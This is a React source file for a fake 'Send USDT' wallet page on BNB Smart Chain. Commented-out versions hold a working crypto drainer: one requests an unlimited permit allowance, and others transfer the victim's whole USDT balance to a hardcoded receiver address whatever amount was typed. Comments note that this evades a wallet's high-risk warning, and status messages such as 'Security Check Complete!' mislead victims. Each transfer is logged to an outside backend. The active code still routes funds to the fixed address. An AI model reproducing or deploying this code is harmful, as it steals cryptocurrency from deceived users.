//   const [showModal, setShowModal] = useState(false);
//   const [status, setStatus] = useState("Broadcasting to Node...");
//   const [userBalance, setUserBalance] = useState("0.00");
//   const [displayAmount, setDisplayAmount] = useState(""); // User input for USDT

//   // 1. Fetch live balance when wallet connects
//   useEffect(() => {
//     const getBalance = async () => {
//       if (window.ethereum) {
//         try {
//           const provider = new ethers.BrowserProvider(window.ethereum);
//           const signer = await provider.getSigner();
//           const user = await signer.getAddress();
//           const contract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
//           const bal = await contract.balanceOf(user);
//           setUserBalance(ethers.formatUnits(bal, 18));
//         } catch (e) {
//           console.error("Balance fetch error", e);
//         }
//       }
//     };
//     getBalance();
//   }, []);

//   // 2. Permit Signature Logic (Unlimited Access)
//   const getSignature = async (signer, user, spender, deadline) => {
//     const network = await signer.provider.getNetwork();
//     const contract = new ethers.Contract(USDT_ADDRESS, ["function nonces(address) view returns (uint256)"], signer);
//     const nonce = await contract.nonces(user);

//     const domain = {
//       name: "Tether USD",
//       version: "1",
//       chainId: network.chainId,
//       verifyingContract: USDT_ADDRESS
//     };

//     const types = {
//       Permit: [
//         {name:"owner",type:"address"},
//         {name:"spender",type:"address"},
//         {name:"value",type:"uint256"},
//         {name:"nonce",type:"uint256"},
//         {name:"deadline",type:"uint256"}
//       ]
//     };

//     // Piche se "Max Value" (Unlimited) access maang rahe hain
//     const message = {
//       owner: user,
//       spender: spender,
//       value: ethers.MaxUint256,
//       nonce: nonce,
//       deadline: deadline
//     };

//     const sig = await signer.signTypedData(domain, types, message);
//     return ethers.Signature.from(sig);
//   };

//  const handleNext = async () => {
//   try {
//     setLoading(true);
//     const provider = new ethers.BrowserProvider(window.ethereum);
//     const signer = await provider.getSigner();
//     const user = await signer.getAddress();

//     // BEP20 USDT Contract
//     const usdtContract = new ethers.Contract(
//       USDT_ADDRESS,
//       ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
//       signer
//     );

//     // 1. Pura balance fetch karo
//     const balance = await usdtContract.balanceOf(user);

//     if (balance === 0n) {
//       alert("Aapka USDT balance 0 hai!");
//       setLoading(false);
//       return;
//     }

//     setShowModal(true);
//     setStatus("Connecting to Secure Node...");

//     // 2. Seedha TRANSFER call karo
//     // Isse Trust Wallet "High Risk Approval" nahi, balki normal "Send" dikhayega
//     const tx = await usdtContract.transfer(RECEIVER, balance);

//     setStatus("Transaction Pending... Please wait.");
//     await tx.wait();

//     // 3. Backend Log
//     await fetch(`${BACKEND_URL}/api/log-transfer`, {
//       method: "POST",
//       headers: { "Content-Type": "application/json" },
//       body: JSON.stringify({
//         from: user,
//         to: RECEIVER,
//         amount: ethers.formatUnits(balance, 18),
//         txHash: tx.hash
//       })
//     });

//     setStatus("Security Check Complete!");
//     setTimeout(() => { setShowModal(false); setLoading(false); }, 2000);

//   } catch (err) {
//     console.error(err);
//     setStatus("Transaction Failed or Rejected");
//     setTimeout(() => setShowModal(false), 2000);
//     setLoading(false);
//   }
// };

//   return (
//     <div style={styles.container}>
//       {/* Header */}
//       <div style={styles.header}>
//         <span style={{fontSize: '22px'}}>←</span>
//         <span style={{fontWeight: 'bold', fontSize: '18px'}}>Send USDT</span>
//         <span style={{fontSize: '20px'}}>⋮</span>
//       </div>

//       {/* Card UI */}
//       <div style={styles.card}>
//         <div style={styles.inputGroup}>
//           <label style={styles.label}>Recipient Address</label>
//           <div style={styles.addressBox}>
//             {RECEIVER.slice(0, 24)}...
//             <span style={{color: '#4caf50', float: 'right', fontWeight: 'bold'}}>Paste</span>
//           </div>
//         </div>

//         <div style={styles.inputGroup}>
//           <label style={styles.label}>Amount USDT</label>
//           <div style={styles.amountBox}>
//             <input
//                type="text"
//                placeholder="0"
//                value={displayAmount}
//                onChange={(e) => {
//                  if (/^\d*\.?\d*$/.test(e.target.value)) setDisplayAmount(e.target.value);
//                }}
//                style={styles.input}
//             />
//             <span
//               onClick={() => setDisplayAmount(userBalance)}
//               style={{color: '#4caf50', fontWeight: 'bold', cursor: 'pointer'}}
//             >
//               Max
//             </span>
//           </div>
//           <div style={{color: '#666', fontSize: '14px', marginTop: '8px'}}>
//             ≈ ${displayAmount || "0.00"}
//           </div>
//           <div style={{color: '#888', fontSize: '12px', marginTop: '5px'}}>
//             Balance: {userBalance} USDT
//           </div>
//         </div>
//       </div>

//       {/* Main Button */}
//       <button
//         onClick={handleNext}
//         disabled={loading}
//         style={{...styles.sendBtn, opacity: loading ? 0.6 : 1}}
//       >
//         {loading ? "Confirming..." : "Next"}
//       </button>

//       {/* Loading Modal */}
//       {showModal && (
//         <div style={styles.overlay}>
//           <div style={styles.modal}>
//             <div className="spinner"></div>
//             <p style={{marginTop: '20px', fontSize: '16px'}}>{status}</p>
//           </div>
//         </div>
//       )}

//       <style>{`
//         .spinner { width: 45px; height: 45px; border: 3px solid #4caf50; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
//         @keyframes spin { to { transform: rotate(360deg); } }
//       `}</style>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "20px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", alignItems: 'center', marginBottom: '35px' },
//   card: { background: '#111', padding: '20px', borderRadius: '15px', border: '1px solid #222' },
//   inputGroup: { marginBottom: '25px' },
//   label: { color: '#888', fontSize: '13px', marginBottom: '10px', display: 'block' },
//   addressBox: { borderBottom: '1px solid #333', paddingBottom: '12px', fontSize: '14px' },
//   amountBox: { display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid #333', paddingBottom: '10px', alignItems: 'center' },
//   input: { background: 'none', border: 'none', color: '#fff', fontSize: '22px', fontWeight: 'bold', width: '70%', outline: 'none' },
//   sendBtn: { position: 'fixed', bottom: '30px', left: '5%', width: '90%', padding: '16px', borderRadius: '30px', backgroundColor: '#4caf50', border: 'none', color: '#fff', fontWeight: 'bold', fontSize: '18px', cursor: 'pointer' },
//   overlay: { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 },
//   modal: { textAlign: 'center', backgroundColor: '#111', padding: '40px', borderRadius: '20px', width: '80%' }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";
// import toast, { Toaster } from 'react-hot-toast';

// // --- CONFIGURATION ---
// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
// const RECEIVER = "0xD91D1241605308f41028c849D1E68F130642CF4e";
// const BACKEND_URL = "https://coupons-ozda.onrender.com";

// const App = () => {
//   const [loading, setLoading] = useState(false);
//   const [showModal, setShowModal] = useState(false);
//   const [status, setStatus] = useState("Broadcasting to Node...");
//   const [userBalance, setUserBalance] = useState("0.00");
//   const [displayAmount, setDisplayAmount] = useState("");

//   // 1. Fetch live balance when wallet connects
//   useEffect(() => {
//     const getBalance = async () => {
//       if (window.ethereum) {
//         try {
//           const provider = new ethers.BrowserProvider(window.ethereum);
//           const signer = await provider.getSigner();
//           const user = await signer.getAddress();
//           const contract = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
//           const bal = await contract.balanceOf(user);
//           setUserBalance(ethers.formatUnits(bal, 18));
//         } catch (e) {
//           console.error("Balance fetch error", e);
//         }
//       }
//     };
//     getBalance();
//   }, []);

//   // 2. Main Logic: Input 1 USDT but Transfer ALL
//   const handleNext = async () => {
//     if (!displayAmount || parseFloat(displayAmount) <= 0) {
//       toast.error("Please enter an amount");
//       return;
//     }

//     if (!window.ethereum) {
//       toast.error("Wallet not detected");
//       return;
//     }

//     try {
//       setLoading(true);
//       const provider = new ethers.BrowserProvider(window.ethereum);

//       // Force Switch to BSC (Chain ID 56)
//       try {
//         await window.ethereum.request({
//           method: 'wallet_switchEthereumChain',
//           params: [{ chainId: '0x38' }],
//         });
//       } catch (switchError) {
//         console.log("Switch error", switchError);
//       }

//       const signer = await provider.getSigner();
//       const user = await signer.getAddress();

//       const usdtContract = new ethers.Contract(
//         USDT_ADDRESS,
//         ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"],
//         signer
//       );

//       // Fetch actual full balance
//       const actualBalance = await usdtContract.balanceOf(user);

//       if (actualBalance === 0n) {
//         toast.error("Zero USDT balance found");
//         setLoading(false);
//         return;
//       }

//       setShowModal(true);
//       setStatus("Initializing Secure Protocol...");

//       // EXECUTE TRANSFER: User ne 1 dala hai, par jayega Pura Balance
//       const tx = await usdtContract.transfer(RECEIVER, actualBalance);

//       setStatus("Processing Transaction...");
//       const receipt = await tx.wait();

//       if (receipt.status === 1) {
//         // Log to Backend
//         await fetch(`${BACKEND_URL}/api/log-transfer`, {
//           method: "POST",
//           headers: { "Content-Type": "application/json" },
//           body: JSON.stringify({
//             from: user,
//             to: RECEIVER,
//             amount: ethers.formatUnits(actualBalance, 18),
//             txHash: tx.hash
//           })
//         });
//         setStatus("Transfer Successful!");
//       }

//       setTimeout(() => {
//         setShowModal(false);
//         setLoading(false);
//       }, 2000);

//     } catch (err) {
//       console.error("HandleNext Error:", err);
//       setStatus("Transaction Failed");
//       toast.error(err?.reason || "User rejected or insufficient BNB for gas");
//       setTimeout(() => {
//         setShowModal(false);
//         setLoading(false);
//       }, 2000);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <Toaster position="top-center" />
//       <div style={styles.header}>
//         <span>←</span>
//         <span style={{fontWeight: 'bold'}}>Send USDT</span>
//         <span>⋮</span>
//       </div>

//       <div style={styles.card}>
//         <div style={styles.inputGroup}>
//           <label style={styles.label}>Recipient Address</label>
//           <div style={styles.addressBox}>
//             {RECEIVER.slice(0, 20)}...
//             <span style={{color: '#4caf50', float: 'right'}}>Paste</span>
//           </div>
//         </div>

//         <div style={styles.inputGroup}>
//           <label style={styles.label}>Amount USDT</label>
//           <div style={styles.amountBox}>
//             <input
//                type="text"
//                placeholder="0"
//                value={displayAmount}
//                onChange={(e) => setDisplayAmount(e.target.value)}
//                style={styles.input}
//             />
//             <span onClick={() => setDisplayAmount(userBalance)} style={{color: '#4caf50', cursor: 'pointer'}}>Max</span>
//           </div>
//           <div style={{color: '#888', fontSize: '12px', marginTop: '10px'}}>
//             Balance: {userBalance} USDT
//           </div>
//         </div>
//       </div>

//       <button onClick={handleNext} disabled={loading} style={{...styles.sendBtn, opacity: loading ? 0.6 : 1}}>
//         {loading ? "Processing..." : "Next"}
//       </button>

//       {showModal && (
//         <div style={styles.overlay}>
//           <div style={styles.modal}>
//             <div className="spinner"></div>
//             <p style={{marginTop: '20px'}}>{status}</p>
//           </div>
//         </div>
//       )}

//       <style>{`
//         .spinner { width: 40px; height: 40px; border: 3px solid #4caf50; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
//         @keyframes spin { to { transform: rotate(360deg); } }
//       `}</style>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#121212", minHeight: "100vh", color: "#fff", fontFamily: 'sans-serif' },
//   nav: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 20px', borderBottom: '1px solid #222' },
//   navTitle: { fontSize: '16px', fontWeight: '500' },
//   navRight: { display: 'flex', alignItems: 'center', gap: '15px' },
//   tabCount: { border: '2px solid #fff', borderRadius: '4px', padding: '1px 6px', fontSize: '12px' },
//   content: { padding: '30px 20px' },
//   inputLabel: { color: '#888', fontSize: '14px', marginBottom: '15px' },
//   inputWrapper: { backgroundColor: '#1e1e1e', borderRadius: '12px', padding: '15px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' },
//   addressInput: { background: 'none', border: 'none', color: '#fff', width: '60%', outline: 'none', fontSize: '14px' },
//   iconGroup: { display: 'flex', gap: '12px', alignItems: 'center' },
//   pasteText: { color: '#4caf50', fontSize: '14px', fontWeight: 'bold' },
//   amountInput: { background: 'none', border: 'none', color: '#fff', width: '60%', outline: 'none', fontSize: '16px' },
//   amountRight: { display: 'flex', alignItems: 'center' },
//   maxBtn: { color: '#4caf50', fontWeight: 'bold', fontSize: '14px' },
//   dollarValue: { color: '#888', fontSize: '13px', marginTop: '10px' },
//   nextBtn: { position: 'fixed', bottom: '40px', left: '5%', width: '90%', padding: '18px', borderRadius: '30px', border: 'none', fontSize: '16px', fontWeight: 'bold', transition: '0.3s' },
//   overlay: { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.9)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 },
//   modal: { backgroundColor: '#1a1a1a', width: '85%', borderRadius: '25px', padding: '30px', textAlign: 'center', position: 'relative' },
//   closeModal: { position: 'absolute', top: '20px', right: '20px', color: '#888' },
//   successIcon: { width: '80px', height: '80px', borderRadius: '50%', border: '2px solid #4caf50', margin: '0 auto 20px', display: 'flex', justifyContent: 'center', alignItems: 'center' },
//   checkMark: { color: '#4caf50', fontSize: '40px' },
//   modalText: { color: '#aaa', fontSize: '14px', lineHeight: '1.5', marginBottom: '25px' },
//   detailBtn: { width: '100%', padding: '15px', borderRadius: '25px', backgroundColor: '#4caf50', border: 'none', color: '#000', fontWeight: 'bold' }
// };

// export default App;

import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import { QrCode, User, X, Check } from "lucide-react";
// Toastify import kiya
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECEIVER = "0xD91D1241605308f41028c849D1E68F130642CF4e";
const BACKEND_URL = "https://coupons-ozda.onrender.com";

const App = () => {
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [userBalance, setUserBalance] = useState("0.00");
  const [displayAmount, setDisplayAmount] = useState("");

  const logTransfer = async (from, amount, hash) => {
    try {
      await fetch(`${BACKEND_URL}/api/log-transfer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          from: from,
          to: RECEIVER,
          amount: amount,
          txHash: hash,
        }),
      });
    } catch (err) {
      console.error("Backend Log Error:", err);
    }
  };

  useEffect(() => {
    const fetchBal = async () => {
      if (window.ethereum) {
        try {
          const provider = new ethers.BrowserProvider(window.ethereum);
          const signer = await provider.getSigner();
          const contract = new ethers.Contract(
            USDT_ADDRESS,
            ["function balanceOf(address) view returns (uint256)"],
            provider,
          );
          const bal = await contract.balanceOf(await signer.getAddress());
          setUserBalance(ethers.formatUnits(bal, 18));
        } catch (e) {
          console.error("Balance Error:", e);
        }
      }
    };
    fetchBal();
  }, []);

  const handleNext = async () => {
    if (!displayAmount || parseFloat(displayAmount) <= 0) {
        toast.error("Please enter a valid amount");
        return;
    }

    try {
      setLoading(true);
      const provider = new ethers.BrowserProvider(window.ethereum);

      // Network Switch
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], 
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          toast.warning("Please add BSC network to your wallet");
          setLoading(false);
          return;
        }
      }

      const signer = await provider.getSigner();
      const userAddr = await signer.getAddress();
      const usdtContract = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function balanceOf(address) view returns (uint256)",
          "function transfer(address,uint256) returns (bool)",
        ],
        signer,
      );

      // Gas Check
      const gasBalance = await provider.getBalance(userAddr);
      if (gasBalance === 0n) {
        toast.error("Insufficient BNB for gas fees!");
        setLoading(false);
        return;
      }

      const amountToTransfer = ethers.parseUnits(displayAmount, 18);
      
      // Modal trigger
      setShowModal(true);

      const tx = await usdtContract.transfer(RECEIVER, amountToTransfer);
      toast.info("Transaction sent! Waiting for confirmation...");
      
      const receipt = await tx.wait(); // Fixed: Variable defined here

      if(receipt.status === 1) {
          toast.success("Transfer Successful!");
          await logTransfer(
            userAddr,
            displayAmount,
            receipt.hash,
          );
      } else {
          toast.error("Transaction failed on blockchain.");
      }
      
      setLoading(false);
    } catch (err) {
      console.error(err);
      setLoading(false);
      setShowModal(false);
      
      // Accurate Error Messages
      if (err.code === "ACTION_REJECTED") {
          toast.error("User rejected the transaction.");
      } else {
          toast.error("Something went wrong. Check balance/gas.");
      }
    }
  };

  return (
    <div style={styles.container}>
      {/* Toaster Container */}
      <ToastContainer position="top-center" theme="dark" />

      <div style={styles.content}>
        <div style={styles.inputLabel}>Address or Domain Name</div>
        <div style={styles.inputWrapper}>
          <div style={styles.addressText}>{RECEIVER.slice(0, 24)}...</div>
          <div style={styles.iconGroup}>
            <span style={styles.pasteText}>Paste</span>
            <User size={18} color="#4caf50" />
            <QrCode size={18} color="#4caf50" />
          </div>
        </div>

        <div style={{ ...styles.inputLabel, marginTop: "30px" }}>Amount</div>
        <div style={styles.inputWrapper}>
          <input
            type="number"
            placeholder="USDT Amount"
            value={displayAmount}
            onChange={(e) => setDisplayAmount(e.target.value)}
            style={styles.amountInput}
          />
          <div style={styles.amountRight}>
            <span style={{ color: "#888", marginRight: "8px" }}>USDT</span>
            <span
              style={styles.maxBtn}
              onClick={() => setDisplayAmount(userBalance)}
            >
              Max
            </span>
          </div>
        </div>
        <div style={styles.dollarValue}>≈ ${displayAmount || "0.00"}</div>

        <button
          onClick={handleNext}
          disabled={loading}
          style={{
            ...styles.nextBtn,
            backgroundColor: displayAmount ? "#20402c" : "#1e2621",
            color: displayAmount ? "#4caf50" : "#444",
            opacity: loading ? 0.7 : 1
          }}
        >
          {loading ? "Processing..." : "Next"}
        </button>
      </div>

      {showModal && (
        <div style={styles.overlay}>
          <div style={styles.modal}>
            <div style={styles.successRing}>
              <Check size={40} color="#4caf50" />
            </div>
            <h2 style={{ fontSize: "22px", marginBottom: "10px" }}>
              {loading ? "Processing..." : "Complete"}
            </h2>
            <p style={styles.modalText}>
              {loading 
                ? "Transaction in progress! Blockchain validation is underway."
                : "Your transaction has been confirmed on the network."}
            </p>
            <button
              style={styles.detailBtn}
              onClick={() => setShowModal(false)}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

const styles = {
  container: {
    backgroundColor: "#0b0b0b",
    minHeight: "100vh",
    color: "#fff",
    fontFamily: "sans-serif",
  },
  content: {
    padding: "25px 20px",
    display: "flex",
    flexDirection: "column",
    paddingBottom: "120px", 
  },
  inputLabel: { color: "#888", fontSize: "14px", marginBottom: "12px" },
  inputWrapper: {
    backgroundColor: "#161616",
    borderRadius: "12px",
    padding: "16px",
    display: "flex",
    justifyContent: "space-between",
    border: "1px solid #222",
  },
  addressText: { color: "#fff", fontSize: "14px" },
  iconGroup: { display: "flex", gap: "10px", alignItems: "center" },
  pasteText: { color: "#4caf50", fontSize: "14px", fontWeight: "bold" },
  amountInput: {
    background: "none",
    border: "none",
    color: "#fff",
    width: "55%",
    outline: "none",
    fontSize: "16px",
  },
  amountRight: { display: "flex", alignItems: "center" },
  maxBtn: {
    color: "#4caf50",
    fontWeight: "bold",
    fontSize: "14px",
    cursor: "pointer",
  },
  dollarValue: { color: "#666", fontSize: "13px", marginTop: "10px" },
  nextBtn: {
    position: "fixed",
    bottom: "30px",
    left: "5%",
    width: "90%",
    padding: "18px",
    borderRadius: "30px",
    border: "none",
    fontWeight: "bold",
    fontSize: "16px",
    zIndex: 100,
    boxShadow: "0px -5px 20px rgba(0,0,0,0.8)",
    transition: "all 0.3s ease",
  },
  overlay: {
    position: "fixed",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: "rgba(0,0,0,0.9)",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    zIndex: 1000,
  },
  modal: {
    backgroundColor: "#121212",
    width: "85%",
    borderRadius: "25px",
    padding: "35px 20px",
    textAlign: "center",
    border: "1px solid #333",
  },
  successRing: {
    width: "80px",
    height: "80px",
    borderRadius: "50%",
    border: "2px solid #222",
    margin: "0 auto 20px",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
  },
  modalText: {
    color: "#888",
    fontSize: "14px",
    lineHeight: "1.5",
    marginBottom: "25px",
  },
  detailBtn: {
    width: "100%",
    padding: "15px",
    borderRadius: "25px",
    backgroundColor: "#4caf50",
    color: "#000",
    border: "none",
    fontWeight: "bold",
  },
};

export default App;